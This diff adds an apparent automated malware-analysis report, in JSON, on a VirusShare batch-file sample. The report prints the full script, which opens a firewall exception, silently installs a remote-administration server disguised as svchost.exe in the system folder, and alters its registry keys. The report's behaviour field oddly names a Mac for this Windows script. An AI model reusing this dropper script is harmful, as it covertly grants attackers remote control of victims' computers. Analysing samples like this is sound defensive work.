@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "SYSTEM": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "@echo off \nnetsh firewall add allowedprogram \"%Windir%\\svchost.exe\" \"Remote Administrator Server\" ENABLE\nreg export \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\" 123.reg\nreg delete  \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\" /f\ncopy /y \"svchost.exe\" \"%SYSTEMROOT%/svchost.exe\" \ncopy /y \"raddrv.dll\" \"%SYSTEMROOT%/raddrv.dll\"\ncopy /y \"admdll.dll\" \"%SYSTEMROOT%/admdll.dll\"\nreg import 111.reg\nregedit /s 111.reg\n\"%SYSTEMROOT%/svchost.exe\" /install /silence\n\"%SYSTEMROOT%/svchost.exe\" /start\nregip.exe"
+    },
+    "filename": "VirusShare_11e5c9c20fc7645884b302d9a1ee6840",
+    "filesize": 490,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "11e5c9c20fc7645884b302d9a1ee6840",
+        "sha1": "716320f3673ed7d5d5d83ee5b54bb896536783f6",
+        "sha256": "bede81893cedfdaf45ff631049b80d7907f5ec5e0c4dbaae3c61a65bef4991ca"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off ",
+            "netsh firewall add allowedprogram \"%Windir%\\svchost.exe\" \"Remote Administrator Server\" ENABLE",
+            "reg export \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\" 123.reg",
+            "reg delete  \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\" /f",
+            "copy /y \"svchost.exe\" \"%SYSTEMROOT%/svchost.exe\" ",
+            "copy /y \"raddrv.dll\" \"%SYSTEMROOT%/raddrv.dll\"",
+            "copy /y \"admdll.dll\" \"%SYSTEMROOT%/admdll.dll\"",
+            "reg import 111.reg",
+            "regedit /s 111.reg",
+            "\"%SYSTEMROOT%/svchost.exe\" /install /silence",
+            "\"%SYSTEMROOT%/svchost.exe\" /start",
+            "regip.exe"
+        ],
+        "file": {
+            "reg export \"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\" 123.reg": "Registry",
+            "reg import 111.reg": "Registry",
+            "regedit /s 111.reg": "Registry",
+            "regip.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.287790",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
